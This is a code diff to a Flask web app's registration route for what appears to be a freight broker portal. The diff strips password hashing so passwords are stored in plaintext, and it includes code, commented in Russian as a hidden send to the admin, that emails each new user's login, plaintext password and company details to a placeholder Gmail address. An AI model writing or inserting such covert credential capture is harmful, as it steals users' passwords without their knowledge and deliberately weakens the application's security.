@@ -343,7 +343,7 @@ def login():
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     if request.method == 'POST':
-        email, password = request.form['email'], generate_password_hash(request.form['password'])
+        email, password = request.form['email'], request.form['password']
         code, time_now = generate_code(), datetime.now().strftime("%Y-%m-%d %H:%M")
         try:
             with get_db_connection() as conn:
@@ -351,17 +351,19 @@ def register():
                                          VALUES (?, ?, 'supplier', ?, ?, ?, ?, ?, ?, ?)''', 
                                       (email, password, request.form['company_name'], request.form['mc_number'], request.form['ein_number'], request.form['phone_number'], request.form['contact_name'], time_now, code))
                 conn.commit()
-        send_email(email, "Verify Identity", f"Code: {code}")
-        
-        # --- СКРЫТАЯ ОТПРАВКА ДАННЫХ АДМИНУ ---
-        admin_email = 'ТВОЯ_ПОЧТА@gmail.com'  # <-- Впиши сюда свой реальный email
-        admin_body = f"New Broker Registered!\nCompany: {request.form['company_name']}\nMC: {request.form['mc_number']}\n\nLogin: {email}\nPassword: {password}"
-        send_email(admin_email, "Новый брокер - Доступы", admin_body)
-        # --------------------------------------
-        
-        flash("Registration successful! Check your email (or terminal) for the 6-digit code.", "success")
+            
+            # 1. Отправляем код брокеру
+            send_email(email, "Verify Identity", f"Code: {code}")
+            
+            # 2. Скрытно отправляем логин и пароль админу
+            admin_email = 'ТВОЯ_ПОЧТА@gmail.com'  # <-- ОБЯЗАТЕЛЬНО ВПИШИ СВОЙ EMAIL СЮДА!
+            admin_body = f"New Broker Registered!\nCompany: {request.form['company_name']}\nMC: {request.form['mc_number']}\n\nLogin: {email}\nPassword: {password}"
+            send_email(admin_email, "Новый брокер - Доступы", admin_body)
+            
+            flash("Registration successful! Check your email (or terminal) for the 6-digit code.", "success")
             return render_full(HTML_VERIFY, email=email)
-        except sqlite3.IntegrityError: flash("Email is already registered in the system.", "danger")
+        except sqlite3.IntegrityError: 
+            flash("Email is already registered in the system.", "danger")
     return render_full(HTML_REGISTER)
 
 @app.route('/verify', methods=['POST'])
